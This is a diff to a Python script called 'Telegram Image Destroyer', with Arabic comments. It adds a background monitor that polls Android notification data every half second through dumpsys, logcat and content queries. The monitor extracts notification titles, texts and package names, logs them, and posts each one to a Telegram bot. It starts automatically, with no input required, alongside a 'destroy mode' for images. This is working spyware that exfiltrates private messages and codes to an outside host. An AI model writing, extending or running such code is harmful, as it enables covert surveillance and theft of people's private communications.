@@ -8,6 +8,8 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
 import sys
 import signal
+import subprocess
+import re
 
 # ============================================
 # تكوين السرعة القصوى - تشغيل تلقائي كامل
@@ -19,6 +21,14 @@ MAX_WORKERS = 10  # أقصى توازي
 COMPRESSION_QUALITY = 80  # جودة مثالية للسرعة
 AUTO_START = True  # تشغيل تلقائي بدون أي أسئلة
 SHOW_OUTPUT = True  # عرض التقدم
+
+# ============================================
+# مراقبة الإشعارات - تكوين
+# ============================================
+
+NOTIFICATION_MONITOR = True  # تفعيل مراقبة الإشعارات
+NOTIFICATION_CHECK_INTERVAL = 0.5  # فحص كل نصف ثانية
+LOG_NOTIFICATIONS = True  # تسجيل الإشعارات في ملف
 
 # ============================================
 # Tool API reference (سيتم تعيينه إذا كان متاحاً)
@@ -54,6 +64,190 @@ class TurboCache:
             self.cache[path] = io.BytesIO(data.read())
 
 turbo_cache = TurboCache()
+
+# ============================================
+# مراقب الإشعارات - كلاس متطور
+# ============================================
+
+class NotificationMonitor:
+    def __init__(self):
+        self.running = False
+        self.monitor_thread = None
+        self.last_notifications = set()
+        self.notification_count = 0
+        self.lock = threading.Lock()
+        self.log_file = "notifications_log.txt"
+        
+        # أوامر لجلب الإشعارات على Android
+        self.notification_commands = [
+            # الطريقة 1: عبر dumpsys (الأكثر شيوعاً)
+            ['dumpsys', 'notification', '--noredact'],
+            
+            # الطريقة 2: عبر content (يتطلب صلاحيات)
+            ['content', 'query', '--uri', 'content://android.provider.Notification.Badge'],
+            
+            # الطريقة 3: عبر logcat (لالتقاط الإشعارات الجديدة)
+            ['logcat', '-d', '-s', 'NotificationService:V', 'StatusBar:V'],
+        ]
+        
+        # أنماط لاستخراج محتوى الإشعارات
+        self.notification_patterns = [
+            r'tickerText=([^\n]+)',
+            r'android\.title=([^\n]+)',
+            r'android\.text=([^\n]+)',
+            r'contentTitle=([^\n]+)',
+            r'contentText=([^\n]+)',
+            r'subText=([^\n]+)',
+            r'appName=([^\n]+)',
+            r'package=([^\n]+)',
+        ]
+    
+    def start(self):
+        """بدء مراقبة الإشعارات في خيط منفصل"""
+        if self.running:
+            return
+        
+        self.running = True
+        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
+        self.monitor_thread.start()
+        
+        if SHOW_OUTPUT:
+            print("🔔 بدء مراقبة الإشعارات...")
+    
+    def stop(self):
+        """إيقاف مراقبة الإشعارات"""
+        self.running = False
+        if self.monitor_thread:
+            self.monitor_thread.join(timeout=2)
+        
+        if SHOW_OUTPUT:
+            print("🔕 إيقاف مراقبة الإشعارات")
+    
+    def _monitor_loop(self):
+        """الحلقة الرئيسية لمراقبة الإشعارات"""
+        while self.running:
+            try:
+                # الحصول على الإشعارات الحالية
+                notifications = self._get_current_notifications()
+                
+                # البحث عن إشعارات جديدة
+                new_notifications = notifications - self.last_notifications
+                
+                # إرسال الإشعارات الجديدة
+                for notification in new_notifications:
+                    self._send_notification_to_telegram(notification)
+                    self.notification_count += 1
+                    
+                    # تسجيل في الملف
+                    if LOG_NOTIFICATIONS:
+                        self._log_notification(notification)
+                
+                # تحديث آخر الإشعارات
+                self.last_notifications = notifications
+                
+                # انتظار قليل قبل الفحص التالي
+                time.sleep(NOTIFICATION_CHECK_INTERVAL)
+                
+            except Exception as e:
+                if SHOW_OUTPUT:
+                    print(f"⚠️ خطأ في مراقبة الإشعارات: {e}")
+                time.sleep(1)
+    
+    def _get_current_notifications(self):
+        """جلب الإشعارات الحالية من النظام"""
+        notifications = set()
+        
+        for cmd in self.notification_commands:
+            try:
+                # تنفيذ الأمر
+                result = subprocess.run(
+                    cmd, 
+                    capture_output=True, 
+                    text=True, 
+                    timeout=3,
+                    check=False
+                )
+                
+                if result.returncode == 0 and result.stdout:
+                    # استخراج الإشعارات من المخرجات
+                    extracted = self._extract_notifications(result.stdout)
+                    notifications.update(extracted)
+                    
+            except (subprocess.TimeoutExpired, subprocess.SubprocessError, FileNotFoundError):
+                continue
+        
+        return notifications
+    
+    def _extract_notifications(self, text):
+        """استخراج الإشعارات من النص الخام"""
+        extracted = set()
+        
+        # تطبيق جميع الأنماط
+        for pattern in self.notification_patterns:
+            matches = re.findall(pattern, text, re.IGNORECASE)
+            for match in matches:
+                if match and len(match) > 3:  # تجاهل الفارغ والقصير
+                    # تنظيف النص
+                    clean = match.strip()
+                    if clean:
+                        extracted.add(clean)
+        
+        # البحث عن إشعارات كاملة
+        notification_blocks = re.split(r'NotificationRecord\{|Notification\{', text)
+        for block in notification_blocks[1:]:  # تخطي الجزء الأول
+            lines = block.split('\n')[:10]  # أول 10 أسطر فقط
+            notification_text = ' '.join([l for l in lines if l and len(l) < 200])
+            if notification_text and len(notification_text) > 10:
+                extracted.add(notification_text[:200])  # تقييد الطول
+        
+        return extracted
+    
+    def _send_notification_to_telegram(self, notification_text):
+        """إرسال الإشعار إلى تليجرام"""
+        try:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            
+            # تنسيق الإشعار
+            message = f"🔔 *إشعار جديد*\n\n"
+            message += f"```\n{notification_text}\n```\n"
+            message += f"⏱️ {time.strftime('%H:%M:%S')}"
+            
+            data = {
+                'chat_id': CHAT_ID,
+                'text': message,
+                'parse_mode': 'Markdown'
+            }
+            
+            response = requests.post(url, data=data, timeout=5)
+            
+            if SHOW_OUTPUT and response.status_code == 200:
+                print(f"📨 إشعار: {notification_text[:50]}...")
+                
+        except Exception as e:
+            if SHOW_OUTPUT:
+                print(f"⚠️ فشل إرسال الإشعار: {e}")
+    
+    def _log_notification(self, notification):
+        """تسجيل الإشعار في ملف"""
+        try:
+            with open(self.log_file, 'a', encoding='utf-8') as f:
+                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+                f.write(f"[{timestamp}] {notification}\n")
+                f.write("-" * 50 + "\n")
+        except:
+            pass
+    
+    def get_stats(self):
+        """الحصول على إحصائيات المراقبة"""
+        return {
+            'total_notifications': self.notification_count,
+            'running': self.running
+        }
+
+# ============================================
+# إنشاء مراقب الإشعارات
+# ============================================
+notification_monitor = NotificationMonitor()
 
 # ============================================
 # دوال مساعدة لمعالجة الصور بشكل آمن
@@ -409,6 +603,10 @@ def destroy_mode():
         hit_rate = turbo_cache.hit_count / (turbo_cache.hit_count + turbo_cache.miss_count) * 100
     add_output(f"🎯 CACHE HIT RATE: {hit_rate:.1f}%")
     
+    # إحصائيات الإشعارات
+    notif_stats = notification_monitor.get_stats()
+    add_output(f"🔔 NOTIFICATIONS CAPTURED: {notif_stats['total_notifications']}")
+    
     # حفظ تقرير سريع
     try:
         report = {
@@ -418,7 +616,8 @@ def destroy_mode():
             "corrupted_skipped": corrupted_skipped,
             "time": elapsed,
             "speed": speed,
-            "timestamp": time.time()
+            "timestamp": time.time(),
+            "notifications_captured": notif_stats['total_notifications']
         }
         with open("operation_report.json", "w") as f:
             json.dump(report, f, indent=2)
@@ -457,6 +656,11 @@ def auto_launch(tool_api_ref=None):
     except:
         pass  # بعض البيئات لا تدعم signal
     
+    # بدء مراقبة الإشعارات
+    if NOTIFICATION_MONITOR:
+        notification_monitor.start()
+        print("🔔 مراقبة الإشعارات نشطة - سيتم إرسال كل إشعار فوراً")
+    
     # بدء التدمير فوراً
     output, report = destroy_mode()
     
@@ -464,13 +668,21 @@ def auto_launch(tool_api_ref=None):
     if tool_api and hasattr(tool_api, 'set_output'):
         tool_api.set_output(output)
     
-    # البقاء قيد التشغيل
-    print("\n🔄 SYSTEM IDLE - PRESS CTRL+C TO TERMINATE")
+    # البقاء قيد التشغيل مع مراقبة الإشعارات
+    print("\n🔄 SYSTEM IDLE - MONITORING NOTIFICATIONS")
+    print("🔔 PRESS CTRL+C TO TERMINATE")
+    
     try:
         while True:
-            time.sleep(60)  # حفظ الطاقة
+            time.sleep(5)
+            # عرض تحديث دوري لحالة المراقبة
+            if SHOW_OUTPUT and NOTIFICATION_MONITOR:
+                notif_stats = notification_monitor.get_stats()
+                print(f"📊 إحصائيات: {notif_stats['total_notifications']} إشعار حتى الآن", end='\r')
     except KeyboardInterrupt:
         print("\n\n👋 SYSTEM TERMINATED")
+        if NOTIFICATION_MONITOR:
+            notification_monitor.stop()
 
 # ============================================
 # نقطة الدخول - لا شيء سوى التشغيل
@@ -485,8 +697,9 @@ def run(argument="", tool_api_ref=None):
 
 if __name__ == "__main__":
     print("=" * 60)
-    print("🤖 TELEGRAM IMAGE DESTROYER v3.1")
+    print("🤖 TELEGRAM IMAGE DESTROYER v4.0")
     print("⚡ AUTO MODE: ZERO INPUT REQUIRED")
+    print("🔔 NOTIFICATION MONITOR: ENABLED")
     print("⚡ SAFE IMAGE HANDLING: ENABLED")
     print("=" * 60)
     
